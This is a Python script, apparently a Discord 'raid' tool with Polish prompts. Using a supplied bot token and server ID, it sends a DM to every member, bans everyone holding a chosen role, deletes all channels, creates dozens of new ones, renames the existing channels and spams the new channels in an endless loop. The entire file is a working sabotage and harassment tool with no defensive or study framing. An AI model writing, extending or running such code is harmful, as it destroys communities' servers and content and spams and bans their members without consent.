import asyncio
import discord

def raid_all(token, guild_id):
    msg = input("Wiadomość do DM/spamu: ")
    channel_name = input("Nazwa nowych kanałów: ") or "raid"
    category_name = input("Nazwa nowych kategorii: ") or "RAID"
    new_channel_count = int(input("Ile nowych kanałów na kategorię: ") or "10")
    category_count = int(input("Ile nowych kategorii: ") or "3")
    mass_ban_role = input("Nazwa roli do masowego bana (ENTER by pominąć): ")
    change_existing = input("Zmieniasz wszystkie istniejące kanały na inną nazwę? (t/n): ").lower() == "t"
    new_existing_name = ""
    if change_existing:
        new_existing_name = input("Nowa nazwa istniejących kanałów: ")

    spam_message = msg
    intents = discord.Intents.all()
    client = discord.Client(intents=intents)

    async def endless_spam(channels, message):
        i = 1
        while True:
            for ch in channels:
                try:
                    await ch.send(message)
                    print(f"SPAM [{ch.name}] #{i}")
                except Exception as e:
                    print(f"[SPAM] [{ch.name}] Błąd: {e}")
            i += 1
            await asyncio.sleep(0.08)

    @client.event
    async def on_ready():
        print(f"Zalogowano jako {client.user}")
        guild = discord.utils.get(client.guilds, id=guild_id)
        if not guild:
            print("Bot nie jest na tym serwerze lub zły guild_id!")
            await client.close()
            return

        # Mass DM
        print("Wysyłam DM do każdego członka...")
        for member in guild.members:
            if member.bot: continue
            try:
                await member.send(msg)
                print(f"DM -> {member}")
            except Exception as e:
                print(f"DM Error: {member}: {e}")

        # Mass Ban
        if mass_ban_role:
            print(f"Masowy ban użytkowników z roli: {mass_ban_role}")
            role = discord.utils.get(guild.roles, name=mass_ban_role)
            if role:
                for member in role.members:
                    try:
                        await member.ban(reason="RAID ALL TOOL")
                        print(f"BAN -> {member}")
                    except Exception as e:
                        print(f"BAN Error: {member}: {e}")
            else:
                print("Nie znaleziono roli do masowego bana.")

        # Delete All Channels
        print("Kasuję WSZYSTKIE kanały...")
        for ch in list(guild.channels):
            try:
                await ch.delete(reason="RAID ALL TOOL")
                print(f"Usunięto {ch.name}")
            except Exception as e:
                print(f"Błąd usuwania {ch}: {e}")

        # Create Categories & Channels
        print("Tworzę nowe kategorie i kanały...")
        created_channels = []
        for cidx in range(category_count):
            try:
                category = await guild.create_category(f"{category_name}-{cidx}")
                print(f"+ Kategoria: {category.name}")
                for i in range(new_channel_count):
                    chan = await guild.create_text_channel(f"{channel_name}-{i}", category=category)
                    created_channels.append(chan)
                    print(f"++ Kanał: {chan.name}")
            except Exception as e:
                print(f"Błąd kategorii/kanału: {e}")

        # Masowa zmiana nazw kanałów
        if change_existing and new_existing_name:
            print("Zmieniam nazwy istniejących kanałów...")
            for channel in guild.channels:
                try:
                    await channel.edit(name=new_existing_name)
                    print(f"Zmieniono nazwę kanału: {channel.id}")
                except Exception as e:
                    print(f"Błąd zmiany nazwy: {e}")

        # Spam ALL new channels non-stop
        print("Spamuję wszystkie nowe kanały non stop...")
        await endless_spam(created_channels, spam_message)

    asyncio.run(client.start(token))